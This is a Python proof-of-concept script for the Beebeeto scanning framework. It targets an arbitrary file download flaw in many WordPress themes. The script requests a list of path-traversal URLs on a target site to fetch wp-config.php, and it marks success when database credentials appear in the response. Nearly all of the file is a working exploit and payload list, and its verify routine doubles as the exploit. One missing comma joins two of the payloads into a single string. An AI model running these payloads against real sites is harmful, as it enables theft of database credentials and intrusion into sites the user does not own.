#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0222',
            'name': 'WordPress Multiple themes /download.php Arbitrary File Download POC',
            'author': 'Lyleaks',
            'create_date': '2014-12-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['Wordpress插件漏洞', 'Themes', 'Arbitrary File Download', 'php'],
            'desc': '"download_file" variable is not sanitized.',
            'references': ['http://packetstormsecurity.com/files/129706/wptheme-download.txt',
          ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = [
            '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
            '/wp-content/force-download.php?file=../wp-config.php',
            '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
            '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
            '/wp-content/themes/markant/download.php?file=../../wp-config.php',
            '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
            '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
            '/wp-content/themes/felis/download.php?file=../wp-config.php',
            '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
            '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php'
            '/wp-content/themes/epic/includes/download.php?file=wp-config.php',
            '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
            '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
            '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
            '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
            '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
            '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php',
            '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
            '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
        ]
        args['poc_ret']['file_path'] = []
        for filename in payload:
            verify_url = args['options']['target'] + filename
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            try:
                req = urllib2.Request(verify_url)
                content = urllib2.urlopen(req).read()
            except:
                continue
            if 'DB_PASSWORD' in content and 'DB_USER' in content:
                args['success'] = True
                args['poc_ret']['file_path'].append(verify_url)
        if not args['poc_ret']['file_path']:
            args['poc_ret'].pop('file_path')
            args['success'] = False
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())